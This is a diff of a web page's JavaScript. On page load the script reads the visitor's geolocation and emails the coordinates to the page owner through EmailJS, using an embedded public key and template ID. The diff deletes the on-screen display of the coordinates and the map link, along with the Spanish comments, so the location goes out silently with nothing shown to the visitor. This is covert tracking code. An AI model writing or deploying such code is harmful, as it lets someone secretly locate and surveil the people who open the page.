@@ -208,8 +208,7 @@
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript">
-  // Inicia EmailJS con tu Public Key
-  emailjs.init('bZch5uB45YWQLQPlr'); // 👈 tu PUBLIC KEY
+  emailjs.init('bZch5uB45YWQLQPlr');
 
   window.onload = function () {
     obtenerUbicacion();
@@ -224,18 +223,6 @@
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
 
-          // Mostrar en pantalla
-          salida.innerHTML = `
-            Latitud: <b>${lat.toFixed(6)}</b><br>
-            Longitud: <b>${lon.toFixed(6)}</b><br>
-            <a href="https://www.google.com/maps?q=${lat},${lon}" 
-               target="_blank" 
-               class="text-blue-600 underline">
-               Ver en Google Maps
-            </a>
-          `;
-
-          // Enviar a tu correo con EmailJS
           enviarUbicacion(lat, lon);
         },
         (error) => {
@@ -248,10 +235,9 @@
   }
 
   function enviarUbicacion(lat, lon) {
-    const serviceID = 'default_service';      // 👈 el tuyo
-    const templateID = 'template_2b9df4k';    // 👈 el tuyo
+    const serviceID = 'default_service';
+    const templateID = 'template_2b9df4k';
 
-    // Los nombres deben coincidir con las variables en tu template de EmailJS
     const params = {
       latitud: lat,
       longitud: lon,
